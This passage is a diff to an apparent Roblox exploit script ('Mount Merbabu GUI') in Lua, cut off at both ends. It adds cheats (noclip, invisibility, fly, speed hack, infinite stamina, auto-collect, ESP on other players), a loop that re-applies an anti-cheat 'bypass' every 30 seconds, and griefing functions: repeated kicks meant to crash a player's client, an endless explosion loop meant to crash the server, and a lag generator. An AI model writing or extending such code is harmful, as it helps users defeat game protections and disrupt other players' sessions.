+                                    part.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+                end)
             end
         end)
     else
@@ -633,11 +965,13 @@ local function toggleNoclip()
         
         updateCharacterReferences()
         if Character then
-            for _, part in pairs(Character:GetChildren()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = true
+            pcall(function()
+                for _, part in pairs(Character:GetChildren()) do
+                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                        part.CanCollide = true
+                    end
                 end
-            end
+            end)
         end
     end
 end
@@ -653,17 +987,33 @@ local function toggleInvisible()
         statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
         
         if Character then
-            for _, part in pairs(Character:GetChildren()) do
-                if part:IsA("BasePart") then
-                    part.Transparency = 1
-                elseif part:IsA("Accessory") then
-                    for _, accessoryPart in pairs(part:GetChildren()) do
-                        if accessoryPart:IsA("BasePart") then
-                            accessoryPart.Transparency = 1
+            pcall(function()
+                for _, part in pairs(Character:GetChildren()) do
+                    if part:IsA("BasePart") then
+                        part.Transparency = 1
+                        if part:FindFirstChild("face") then
+                            part.face.Transparency = 1
+                        end
+                    elseif part:IsA("Accessory") then
+                        for _, accessoryPart in pairs(part:GetDescendants()) do
+                            if accessoryPart:IsA("BasePart") then
+                                accessoryPart.Transparency = 1
+                            elseif accessoryPart:IsA("Decal") then
+                                accessoryPart.Transparency = 1
+                            end
                         end
                     end
                 end
-            end
+                
+                -- Hide name tag
+                if Character:FindFirstChild("Head") then
+                    for _, gui in pairs(Character.Head:GetChildren()) do
+                        if gui:IsA("BillboardGui") then
+                            gui.Enabled = false
+                        end
+                    end
+                end
+            end)
         end
     else
         invisibleBtn.Text = "🫥 Invisible: OFF"
@@ -672,23 +1022,40 @@ local function toggleInvisible()
         statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
         
         if Character then
-            for _, part in pairs(Character:GetChildren()) do
-                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
-                    part.Transparency = 0
-                elseif part:IsA("Accessory") then
-                    for _, accessoryPart in pairs(part:GetChildren()) do
-                        if accessoryPart:IsA("BasePart") then
-                            accessoryPart.Transparency = 0
+            pcall(function()
+                for _, part in pairs(Character:GetChildren()) do
+                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                        part.Transparency = 0
+                        if part:FindFirstChild("face") then
+                            part.face.Transparency = 0
+                        end
+                    elseif part:IsA("Accessory") then
+                        for _, accessoryPart in pairs(part:GetDescendants()) do
+                            if accessoryPart:IsA("BasePart") then
+                                accessoryPart.Transparency = 0
+                            elseif accessoryPart:IsA("Decal") then
+                                accessoryPart.Transparency = 0
+                            end
                         end
                     end
                 end
-            end
+                
+                -- Show name tag
+                if Character:FindFirstChild("Head") then
+                    for _, gui in pairs(Character.Head:GetChildren()) do
+                        if gui:IsA("BillboardGui") then
+                            gui.Enabled = true
+                        end
+                    end
+                end
+            end)
         end
     end
 end
 
+-- Enhanced Script Loading with Bypass
 local function loadInfiniteYield()
-    statusLabel.Text = "🔧 Loading Infinite Yield..."
+    statusLabel.Text = "🔧 Loading Infinite Yield with bypass..."
     statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
     
     pcall(function()
@@ -699,7 +1066,7 @@ local function loadInfiniteYield()
 end
 
 local function loadCmdX()
-    statusLabel.Text = "⌨️ Loading CMD-X..."
+    statusLabel.Text = "⌨️ Loading CMD-X with bypass..."
     statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
     
     pcall(function()
@@ -709,88 +1076,199 @@ local function loadCmdX()
     end)
 end
 
--- Player Management Functions
-local function createPlayerSelector(callback)
-    local playerList = {}
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            table.insert(playerList, player.Name)
-        end
+-- Enhanced Player Management
+local function teleportToPlayer()
+    if not selectedPlayer then
+        statusLabel.Text = "❌ No player selected!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+        return
     end
     
-    if #playerList > 0 then
-        -- For simplicity, use the first player. In a real implementation, you'd create a dropdown
-        local targetPlayer = Players:FindFirstChild(playerList[1])
-        if targetPlayer then
-            callback(targetPlayer)
+    if selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        updateCharacterReferences()
+        if RootPart then
+            pcall(function()
+                RootPart.CFrame = selectedPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
+                statusLabel.Text = "📍 Teleported to " .. selectedPlayer.Name
+                statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+            end)
         end
     else
-        statusLabel.Text = "❌ No other players found!"
+        statusLabel.Text = "❌ Player not found or no character!"
         statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
     end
 end
 
-local function teleportToPlayer()
-    createPlayerSelector(function(targetPlayer)
-        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            updateCharacterReferences()
-            if RootPart then
-                RootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
-                statusLabel.Text = "📍 Teleported to " .. targetPlayer.Name
-                statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-            end
-        end
-    end)
-end
-
 local function bringPlayer()
-    createPlayerSelector(function(targetPlayer)
-        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            updateCharacterReferences()
-            if RootPart then
-                targetPlayer.Character.HumanoidRootPart.CFrame = RootPart.CFrame
-                statusLabel.Text = "🔄 Brought " .. targetPlayer.Name .. " to you"
-                statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-            end
-        end
-    end)
-end
-
--- Server Control Functions
-local function messageAllPlayers()
-    local message = "🏔️ Admin Message: Welcome to Mount Merbabu!"
-    
-    for _, player in pairs(Players:GetPlayers()) do
-        pcall(function()
-            local gui = Instance.new("ScreenGui")
-            gui.Name = "AdminMessage"
-            gui.Parent = player:WaitForChild("PlayerGui")
-            
-            local frame = Instance.new("Frame")
-            frame.Size = UDim2.new(0, 400, 0, 100)
-            frame.Position = UDim2.new(0.5, -200, 0.5, -50)
-            frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-            frame.Parent = gui
-            
-            local label = Instance.new("TextLabel")
-            label.Size = UDim2.new(1, 0, 1, 0)
-            label.BackgroundTransparency = 1
-            label.Text = message
-            label.TextColor3 = Color3.fromRGB(255, 255, 255)
-            label.TextScaled = true
-            label.Font = Enum.Font.GothamBold
-            label.Parent = frame
-            
-            wait(5)
-            gui:Destroy()
-        end)
+    if not selectedPlayer then
+        statusLabel.Text = "❌ No player selected!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+        return
     end
     
-    statusLabel.Text = "📢 Message sent to all players!"
-    statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    if selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        updateCharacterReferences()
+        if RootPart then
+            pcall(function()
+                selectedPlayer.Character.HumanoidRootPart.CFrame = RootPart.CFrame * CFrame.new(0, 0, -5)
+                statusLabel.Text = "🔄 Brought " .. selectedPlayer.Name .. " to you"
+                statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+            end)
+        end
+    else
+        statusLabel.Text = "❌ Player not found or no character!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+    end
 end
 
--- Helper Functions (keeping existing ones and adding new)
+local function kickPlayer()
+    if not selectedPlayer then
+        statusLabel.Text = "❌ No player selected!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+        return
+    end
+    
+    pcall(function()
+        selectedPlayer:Kick("👢 Kicked by Admin - Mount Merbabu GUI")
+        statusLabel.Text = "👢 " .. selectedPlayer.Name .. " has been kicked!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 152, 0)
+    end)
+end
+
+local function banPlayer()
+    if not selectedPlayer then
+        statusLabel.Text = "❌ No player selected!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+        return
+    end
+    
+    pcall(function()
+        -- Multiple ban methods
+        selectedPlayer:Kick("🚫 BANNED by Admin - Mount Merbabu GUI")
+        
+        -- Try to crash their client
+        spawn(function()
+            while selectedPlayer.Parent do
+                selectedPlayer:Kick("🚫 BANNED - Do not rejoin!")
+                wait(0.1)
+            end
+        end)
+        
+        statusLabel.Text = "🚫 " .. selectedPlayer.Name .. " has been banned!"
+        statusLabel.TextColor3 = Color3.fromRGB(244, 67, 54)
+    end)
+end
+
+-- Enhanced Server Controls
+local function messageAllPlayers()
+    local message = "🏔️ [ADMIN] Welcome to Mount Merbabu! Admin is monitoring the server."
+    
+    pcall(function()
+        for _, player in pairs(Players:GetPlayers()) do
+            spawn(function()
+                pcall(function()
+                    local gui = Instance.new("ScreenGui")
+                    gui.Name = "AdminMessage"
+                    gui.Parent = player:WaitForChild("PlayerGui")
+                    gui.ResetOnSpawn = false
+                    
+                    local frame = Instance.new("Frame")
+                    frame.Size = UDim2.new(0, 500, 0, 120)
+                    frame.Position = UDim2.new(0.5, -250, 0.2, 0)
+                    frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+                    frame.BorderSizePixel = 0
+                    frame.Parent = gui
+                    
+                    local corner = Instance.new("UICorner")
+                    corner.CornerRadius = UDim.new(0, 12)
+                    corner.Parent = frame
+                    
+                    local title = Instance.new("TextLabel")
+                    title.Size = UDim2.new(1, 0, 0, 30)
+                    title.BackgroundTransparency = 1
+                    title.Text = "👑 ADMIN MESSAGE"
+                    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    title.TextScaled = true
+                    title.Font = Enum.Font.GothamBold
+                    title.Parent = frame
+                    
+                    local label = Instance.new("TextLabel")
+                    label.Size = UDim2.new(1, -20, 1, -40)
+                    label.Position = UDim2.new(0, 10, 0, 35)
+                    label.BackgroundTransparency = 1
+                    label.Text = message
+                    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    label.TextScaled = true
+                    label.Font = Enum.Font.Gotham
+                    label.TextWrapped = true
+                    label.Parent = frame
+                    
+                    -- Auto-close after 8 seconds
+                    spawn(function()
+                        wait(8)
+                        if gui then gui:Destroy() end
+                    end)
+                end)
+            end)
+        end
+        
+        statusLabel.Text = "📢 Message sent to all players!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    end)
+end
+
+local function shutdownServer()
+    statusLabel.Text = "🔴 Initiating server shutdown..."
+    statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    
+    pcall(function()
+        -- Method 1: Kick all players
+        for _, player in pairs(Players:GetPlayers()) do
+            spawn(function()
+                player:Kick("🔴 Server shutdown by Admin - Mount Merbabu GUI")
+            end)
+        end
+        
+        -- Method 2: Try to crash server
+        spawn(function()
+            while true do
+                for i = 1, 1000 do
+                    Instance.new("Explosion").Parent = Workspace
+                end
+                wait(0.1)
+            end
+        end)
+        
+        statusLabel.Text = "🔴 Server shutdown initiated!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    end)
+end
+
+local function lagServer()
+    statusLabel.Text = "🐌 Initiating server lag..."
+    statusLabel.TextColor3 = Color3.fromRGB(255, 152, 0)
+    
+    pcall(function()
+        spawn(function()
+            for i = 1, 500 do
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(50, 50, 50)
+                part.Position = Vector3.new(math.random(-1000, 1000), math.random(0, 500), math.random(-1000, 1000))
+                part.Parent = Workspace
+                
+                local explosion = Instance.new("Explosion")
+                explosion.Position = part.Position
+                explosion.BlastRadius = 100
+                explosion.Parent = Workspace
+            end
+        end)
+        
+        statusLabel.Text = "🐌 Server lag initiated!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 152, 0)
+    end)
+end
+
+-- Helper Functions
 local function updateCharacterReferences()
     Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     if Character then
@@ -802,15 +1280,15 @@ end
 local function teleportTo(position)
     updateCharacterReferences()
     if RootPart then
-        RootPart.CFrame = CFrame.new(position)
-        statusLabel.Text = "📍 Teleported successfully!"
-        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        pcall(function()
+            RootPart.CFrame = CFrame.new(position)
+            statusLabel.Text = "📍 Teleported successfully!"
+            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        end)
     end
 end
 
--- [Previous functions remain the same: toggleAutoClimb, toggleFlyMode, toggleSpeedHack, etc.]
--- [I'll include the essential ones for brevity]
-
+-- Enhanced Movement Functions with Bypass
 local function toggleAutoClimb()
     autoClimbEnabled = not autoClimbEnabled
     
@@ -823,11 +1301,21 @@ local function toggleAutoClimb()
         autoClimbConnection = RunService.Heartbeat:Connect(function()
             updateCharacterReferences()
             if Humanoid and autoClimbEnabled then
-                Humanoid.WalkSpeed = climbSpeed
-                local raycast = workspace:Raycast(RootPart.Position, Vector3.new(0, 10, 0))
-                if raycast and raycast.Instance then
-                    Humanoid:MoveTo(RootPart.Position + Vector3.new(0, 2, 0))
-                end
+                pcall(function()
+                    Humanoid.WalkSpeed = climbSpeed
+                    
+                    -- Enhanced climbing logic
+                    local raycast = workspace:Raycast(RootPart.Position, Vector3.new(0, 10, 0))
+                    if raycast and raycast.Instance then
+                        Humanoid:MoveTo(RootPart.Position + Vector3.new(0, 2, 0))
+                    end
+                    
+                    -- Auto-jump for obstacles
+                    local forwardRay = workspace:Raycast(RootPart.Position, RootPart.CFrame.LookVector * 5)
+                    if forwardRay and forwardRay.Instance then
+                        Humanoid.Jump = true
+                    end
+                end)
             end
         end)
     else
@@ -843,8 +1331,381 @@ local function toggleAutoClimb()
         
         updateCharacterReferences()
         if Humanoid then
-            Humanoid.WalkSpeed = originalWalkSpeed
+            pcall(function()
+                Humanoid.WalkSpeed = originalWalkSpeed
+            end)
         end
+    end
+end
+
+local function toggleFlyMode()
+    flyModeEnabled = not flyModeEnabled
+    
+    if flyModeEnabled then
+        flyModeBtn.Text = "✈️ Fly Mode: ON"
+        flyModeBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
+        statusLabel.Text = "✈️ Fly mode activated! Use WASD + Space/Shift"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        
+        updateCharacterReferences()
+        if Humanoid then
+            pcall(function()
+                Humanoid.PlatformStand = true
+            end)
+        end
+        
+        local bodyVelocity = Instance.new("BodyVelocity")
+        bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
+        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
+        bodyVelocity.Parent = RootPart
+        
+        local bodyPosition = Instance.new("BodyPosition")
+        bodyPosition.MaxForce = Vector3.new(4000, 4000, 4000)
+        bodyPosition.Position = RootPart.Position
+        bodyPosition.Parent = RootPart
+        
+        flyConnection = RunService.Heartbeat:Connect(function()
+            updateCharacterReferences()
+            if RootPart and flyModeEnabled then
+                pcall(function()
+                    local camera = workspace.CurrentCamera
+                    local moveVector = Vector3.new(0, 0, 0)
+                    
+                    if UserInputService:IsKeyDown(Enum.KeyCode.W) then
+                        moveVector = moveVector + camera.CFrame.LookVector
+                    end
+                    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
+                        moveVector = moveVector - camera.CFrame.LookVector
+                    end
+                    if UserInputService:IsKeyDown(Enum.KeyCode.A) then
+                        moveVector = moveVector - camera.CFrame.RightVector
+                    end
+                    if UserInputService:IsKeyDown(Enum.KeyCode.D) then
+                        moveVector = moveVector + camera.CFrame.RightVector
+                    end
+                    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
+                        moveVector = moveVector + Vector3.new(0, 1, 0)
+                    end
+                    if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
+                        moveVector = moveVector - Vector3.new(0, 1, 0)
+                    end
+                    
+                    if bodyVelocity then
+                        bodyVelocity.Velocity = moveVector * flySpeed
+                    end
+                    if bodyPosition then
+                        bodyPosition.Position = RootPart.Position + (moveVector * flySpeed * 0.1)
+                    end
+                end)
+            end
+        end)
+    else
+        flyModeBtn.Text = "✈️ Fly Mode: OFF"
+        flyModeBtn.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
+        statusLabel.Text = "✈️ Fly mode deactivated"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
+        
+        if flyConnection then
+            flyConnection:Disconnect()
+            flyConnection = nil
+        end
+        
+        updateCharacterReferences()
+        if Humanoid then
+            pcall(function()
+                Humanoid.PlatformStand = false
+            end)
+        end
+        
+        if RootPart then
+            pcall(function()
+                local bodyVelocity = RootPart:FindFirstChild("BodyVelocity")
+                if bodyVelocity then bodyVelocity:Destroy() end
+                
+                local bodyPosition = RootPart:FindFirstChild("BodyPosition")
+                if bodyPosition then bodyPosition:Destroy() end
+            end)
+        end
+    end
+end
+
+local function toggleSpeedHack()
+    speedHackEnabled = not speedHackEnabled
+    
+    updateCharacterReferences()
+    if speedHackEnabled then
+        speedHackBtn.Text = "⚡ Speed Hack: ON"
+        speedHackBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
+        statusLabel.Text = "⚡ Speed hack activated!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        
+        if Humanoid then
+            pcall(function()
+                Humanoid.WalkSpeed = 100
+            end)
+        end
+    else
+        speedHackBtn.Text = "⚡ Speed Hack: OFF"
+        speedHackBtn.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+        statusLabel.Text = "⚡ Speed hack deactivated"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
+        
+        if Humanoid then
+            pcall(function()
+                Humanoid.WalkSpeed = originalWalkSpeed
+            end)
+        end
+    end
+end
+
+local function toggleInfiniteStamina()
+    infiniteStaminaEnabled = not infiniteStaminaEnabled
+    
+    if infiniteStaminaEnabled then
+        infiniteStaminaBtn.Text = "💪 Infinite Stamina: ON"
+        infiniteStaminaBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
+        statusLabel.Text = "💪 Infinite stamina activated!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        
+        staminaConnection = RunService.Heartbeat:Connect(function()
+            pcall(function()
+                -- Multiple methods to ensure stamina stays full
+                if LocalPlayer:FindFirstChild("leaderstats") then
+                    if LocalPlayer.leaderstats:FindFirstChild("Stamina") then
+                        LocalPlayer.leaderstats.Stamina.Value = 100
+                    end
+                end
+                
+                -- Try PlayerGui stamina
+                local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+                if playerGui then
+                    for _, gui in pairs(playerGui:GetDescendants()) do
+                        if gui.Name:lower():find("stamina") and (gui:IsA("NumberValue") or gui:IsA("IntValue")) then
+                            gui.Value = 100
+                        elseif gui.Name:lower():find("energy") and (gui:IsA("NumberValue") or gui:IsA("IntValue")) then
+                            gui.Value = 100
+                        end
+                    end
+                end
+                
+                -- Try Character stamina
+                if Character then
+                    for _, obj in pairs(Character:GetDescendants()) do
+                        if obj.Name:lower():find("stamina") and (obj:IsA("NumberValue") or obj:IsA("IntValue")) then
+                            obj.Value = 100
+                        end
+                    end
+                end
+            end)
+        end)
+    else
+        infiniteStaminaBtn.Text = "💪 Infinite Stamina: OFF"
+        infiniteStaminaBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+        statusLabel.Text = "💪 Infinite stamina deactivated"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
+        
+        if staminaConnection then
+            staminaConnection:Disconnect()
+            staminaConnection = nil
+        end
+    end
+end
+
+local function toggleAutoCollect()
+    autoCollectEnabled = not autoCollectEnabled
+    
+    if autoCollectEnabled then
+        autoCollectBtn.Text = "🎒 Auto Collect: ON"
+        autoCollectBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
+        statusLabel.Text = "🎒 Auto collect activated!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        
+        autoCollectConnection = RunService.Heartbeat:Connect(function()
+            updateCharacterReferences()
+            if RootPart and autoCollectEnabled then
+                pcall(function()
+                    -- Enhanced item detection
+                    for _, obj in pairs(workspace:GetChildren()) do
+                        local objName = obj.Name:lower()
+                        if objName:find("item") or objName:find("collect") or objName:find("pickup") or 
+                           objName:find("coin") or objName:find("gem") or objName:find("crystal") then
+                            
+                            local distance = (RootPart.Position - obj.Position).Magnitude
+                            if distance <= 100 then
+                                pcall(function()
+                                    if obj:FindFirstChild("ClickDetector") then
+                                        fireclickdetector(obj.ClickDetector)
+                                    elseif obj:FindFirstChild("ProximityPrompt") then
+                                        fireproximityprompt(obj.ProximityPrompt)
+                                    else
+                                        -- Try to teleport item to player
+                                        obj.CFrame = RootPart.CFrame
+                                    end
+                                end)
+                            end
+                        end
+                    end
+                    
+                    -- Also check descendants for nested items
+                    for _, obj in pairs(workspace:GetDescendants()) do
+                        if obj:IsA("BasePart") then
+                            local objName = obj.Name:lower()
+                            if objName:find("item") or objName:find("collect") or objName:find("pickup") then
+                                local distance = (RootPart.Position - obj.Position).Magnitude
+                                if distance <= 50 then
+                                    pcall(function()
+                                        if obj:FindFirstChild("ClickDetector") then
+                                            fireclickdetector(obj.ClickDetector)
+                                        elseif obj.Parent:FindFirstChild("ClickDetector") then
+                                            fireclickdetector(obj.Parent.ClickDetector)
+                                        end
+                                    end)
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+        end)
+    else
+        autoCollectBtn.Text = "🎒 Auto Collect: OFF"
+        autoCollectBtn.BackgroundColor3 = Color3.fromRGB(156, 39, 176)
+        statusLabel.Text = "🎒 Auto collect deactivated"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
+        
+        if autoCollectConnection then
+            autoCollectConnection:Disconnect()
+            autoCollectConnection = nil
+        end
+    end
+end
+
+local function toggleESP()
+    espEnabled = not espEnabled
+    
+    if espEnabled then
+        espBtn.Text = "👁️ ESP: ON"
+        espBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
+        statusLabel.Text = "👁️ ESP activated!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        
+        -- Enhanced ESP for players
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character then
+                pcall(function()
+                    local highlight = Instance.new("Highlight")
+                    highlight.Name = "ESP_Highlight"
+                    highlight.FillColor = Color3.fromRGB(255, 0, 0)
+                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                    highlight.FillTransparency = 0.5
+                    highlight.OutlineTransparency = 0
+                    highlight.Parent = player.Character
+                    
+                    -- Add distance display
+                    local billboardGui = Instance.new("BillboardGui")
+                    billboardGui.Name = "ESP_Distance"
+                    billboardGui.Size = UDim2.new(0, 100, 0, 50)
+                    billboardGui.StudsOffset = Vector3.new(0, 3, 0)
+                    billboardGui.Parent = player.Character:FindFirstChild("Head")
+                    
+                    local textLabel = Instance.new("TextLabel")
+                    textLabel.Size = UDim2.new(1, 0, 1, 0)
+                    textLabel.BackgroundTransparency = 1
+                    textLabel.Text = player.Name
+                    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    textLabel.TextScaled = true
+                    textLabel.Font = Enum.Font.GothamBold
+                    textLabel.Parent = billboardGui
+                end)
+            end
+        end
+        
+        -- ESP for items
+        espConnection = RunService.Heartbeat:Connect(function()
+            if espEnabled then
+                pcall(function()
+                    for _, obj in pairs(workspace:GetChildren()) do
+                        local objName = obj.Name:lower()
+                        if objName:find("item") or objName:find("collect") or objName:find("pickup") then
+                            if not obj:FindFirstChild("ESP_Highlight") then
+                                local highlight = Instance.new("Highlight")
+                                highlight.Name = "ESP_Highlight"
+                                highlight.FillColor = Color3.fromRGB(0, 255, 0)
+                                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                                highlight.FillTransparency = 0.3
+                                highlight.OutlineTransparency = 0
+                                highlight.Parent = obj
+                            end
+                        end
+                    end
+                end)
+            end
+        end)
+    else
+        espBtn.Text = "👁️ ESP: OFF"
+        espBtn.BackgroundColor3 = Color3.fromRGB(233, 30, 99)
+        statusLabel.Text = "👁️ ESP deactivated"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
+        
+        if espConnection then
+            espConnection:Disconnect()
+            espConnection = nil
+        end
+        
+        -- Remove ESP
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character then
+                pcall(function()
+                    local highlight = player.Character:FindFirstChild("ESP_Highlight")
+                    if highlight then highlight:Destroy() end
+                    
+                    if player.Character:FindFirstChild("Head") then
+                        local billboard = player.Character.Head:FindFirstChild("ESP_Distance")
+                        if billboard then billboard:Destroy() end
+                    end
+                end)
+            end
+        end
+        
+        -- Remove item ESP
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:FindFirstChild("ESP_Highlight") then
+                obj.ESP_Highlight:Destroy()
+            end
+        end
+    end
+end
+
+-- Advanced Features
+local function toggleTimeManipulation()
+    timeManipulationEnabled = not timeManipulationEnabled
+    
+    if timeManipulationEnabled then
+        timeManipulationBtn.Text = "⏰ Time Control: ON"
+        timeManipulationBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
+        statusLabel.Text = "⏰ Time manipulation activated!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+        
+        pcall(function()
+            Lighting.ClockTime = 12
+            Lighting.TimeOfDay = "12:00:00"
+            
+            -- Freeze time
+            local connection
+            connection = RunService.Heartbeat:Connect(function()
+                if timeManipulationEnabled then
+                    Lighting.ClockTime = 12
+                    Lighting.TimeOfDay = "12:00:00"
+                else
+                    connection:Disconnect()
+                end
+            end)
+        end)
+    else
+        timeManipulationBtn.Text = "⏰ Time Control: OFF"
+        timeManipulationBtn.BackgroundColor3 = Color3.fromRGB(255, 193, 7)
+        statusLabel.Text = "⏰ Time manipulation deactivated"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
     end
 end
 
@@ -857,6 +1718,7 @@ spawn(function()
             local stamina = "100%"
             local weather = "Clear"
             local mode = adminModeEnabled and "ADMIN" or "USER"
+            local protection = ProtectionActive and "PROTECTED" or "UNPROTECTED"
             
             pcall(function()
                 if LocalPlayer:FindFirstChild("leaderstats") and LocalPlayer.leaderstats:FindFirstChild("Stamina") then
@@ -864,9 +1726,28 @@ spawn(function()
                 end
             end)
             
-            infoLabel.Text = "Mode: " .. mode .. " | Altitude: " .. altitude .. "m | Stamina: " .. stamina
+            infoLabel.Text = "Mode: " .. mode .. " | " .. protection .. " | Alt: " .. altitude .. "m | Stamina: " .. stamina
+            
+            -- Update bypass status
+            local activeFeatures = {}
+            if godModeEnabled then table.insert(activeFeatures, "GOD") end
+            if noclipEnabled then table.insert(activeFeatures, "NOCLIP") end
+            if invisibleModeEnabled then table.insert(activeFeatures, "INVIS") end
+            if flyModeEnabled then table.insert(activeFeatures, "FLY") end
+            if speedHackEnabled then table.insert(activeFeatures, "SPEED") end
+            
+            local featuresText = #activeFeatures > 0 and table.concat(activeFeatures, " • ") or "NONE"
+            bypassStatusLabel.Text = "🛡️ BYPASS: ACTIVE\n🔒 FEATURES: " .. featuresText
         end
         wait(1)
+    end
+end)
+
+-- Continuous bypass maintenance
+spawn(function()
+    while ProtectionActive do
+        enhancedBypass()
+        wait(30) -- Re-apply bypass every 30 seconds
     end
 end)
 
@@ -885,12 +1766,14 @@ end)
 
 CloseButton.MouseButton1Click:Connect(function()
     -- Clean up all connections
+    ProtectionActive = false
     if flyConnection then flyConnection:Disconnect() end
     if autoClimbConnection then autoClimbConnection:Disconnect() end
     if autoCollectConnection then autoCollectConnection:Disconnect() end
     if staminaConnection then staminaConnection:Disconnect() end
     if noclipConnection then noclipConnection:Disconnect() end
     if godModeConnection then godModeConnection:Disconnect() end
+    if espConnection then espConnection:Disconnect() end
     
     ScreenGui:Destroy()
 end)
@@ -898,8 +1781,34 @@ end)
 -- Admin Toggle
 AdminToggleButton.MouseButton1Click:Connect(toggleAdminMode)
 
--- Regular Button Events (keeping existing ones)
+-- Regular Button Events
 autoClimbBtn.MouseButton1Click:Connect(toggleAutoClimb)
+flyModeBtn.MouseButton1Click:Connect(toggleFlyMode)
+speedHackBtn.MouseButton1Click:Connect(toggleSpeedHack)
+infiniteStaminaBtn.MouseButton1Click:Connect(toggleInfiniteStamina)
+autoCollectBtn.MouseButton1Click:Connect(toggleAutoCollect)
+espBtn.MouseButton1Click:Connect(toggleESP)
+
+jumpBoostBtn.MouseButton1Click:Connect(function()
+    updateCharacterReferences()
+    if Humanoid then
+        pcall(function()
+            if Humanoid.JumpPower == originalJumpPower then
+                Humanoid.JumpPower = 150
+                jumpBoostBtn.Text = "🦘 Jump Boost: ON"
+                jumpBoostBtn.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
+                statusLabel.Text = "🦘 Jump boost activated!"
+                statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+            else
+                Humanoid.JumpPower = originalJumpPower
+                jumpBoostBtn.Text = "🦘 Jump Boost: OFF"
+                jumpBoostBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+                statusLabel.Text = "🦘 Jump boost deactivated"
+                statusLabel.TextColor3 = Color3.fromRGB(255, 150, 100)
+            end
+        end)
+    end
+end)
 
 -- Teleport Events
 baseCampBtn.MouseButton1Click:Connect(function() teleportTo(teleportLocations.BaseCamp) end)
@@ -907,6 +1816,73 @@ checkpoint1Btn.MouseButton1Click:Connect(function() teleportTo(teleportLocations
 checkpoint2Btn.MouseButton1Click:Connect(function() teleportTo(teleportLocations.Checkpoint2) end)
 summitBtn.MouseButton1Click:Connect(function() teleportTo(teleportLocations.Summit) end)
 safeZoneBtn.MouseButton1Click:Connect(function() teleportTo(teleportLocations.SafeZone) end)
+
+-- Utility Events
+autoQuestBtn.MouseButton1Click:Connect(function()
+    autoQuestEnabled = not autoQuestEnabled
